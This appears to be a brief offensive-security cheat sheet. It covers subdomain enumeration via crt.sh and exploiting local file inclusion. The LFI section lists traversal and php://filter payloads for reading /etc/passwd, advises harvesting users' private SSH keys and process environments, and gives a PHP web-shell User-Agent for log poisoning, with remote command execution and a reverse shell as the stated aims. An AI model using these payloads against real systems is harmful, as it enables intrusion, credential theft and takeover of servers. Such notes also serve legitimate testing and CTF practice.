# Subdomain Enumeration:

All Unique Subdomais will be saved in a file named example.com_subdomains.

- using crt.sh
  - `export WEB=example.com`

  - ```curl https://crt.sh/?q=%25.$WEB | grep -Eo '.+\.'+$WEB | sed -e 's/<BR>/\n/g' -e 's/<TD>//g' -e  's/    //g' -e  's/ <TITLE>crt.sh | .*$/\n/g' | sort -u >  ${WEB}_subdomains```


# LFI:

## Some Quick LFI Bypasses for parameter "File":

- ?File=....//....//....//....//....//etc/passwd

- ?File=something_valid../../../../../../../etc/passwd

- ?File=php://filter/convert.base64-encode/resource=/etc/passwd

## What to do when you have LFI:

- Did you enumerate users? look at /etc/passwd

- Did you check all user's private ssh keys? usually located at /home/"user"/.ssh/id_rsa

- Enumerate what is running on the server and what Version. Write a python script to read /proc/<number>/cmdline.

  - Also you can read /proc/self/cmdline and /proc/self/environ 
- Can you Access /var/log/apahce2/access.log or  /var/log/nginx/access.log ? If yes you can try to get a reverse shell using log poisoning

  - Send a GET request with ```User-Agent: <?php system($_GET['cmd']); ?>```
  
  - Now you Can execute commands by visit using the LFI https://website.com?file=/var/log/nginx/access.log?cmd=id 
  
- If the site is using $_SESSION in the requests and you can access you sessions from /tmp/sess_a4f8b6d72aa5be42459cdf0c08256543 // note that the part after sess is the php session id.
  - Then you can change what is sent in $_SESSION to contain malicious code to execute.
  - https://www.pwny.cc/web-attacks/local-file-inclusion-lfi/lfi-to-rce Is a great resource.  

- Finally Don't forget to check the source code of the application and further analyze it.
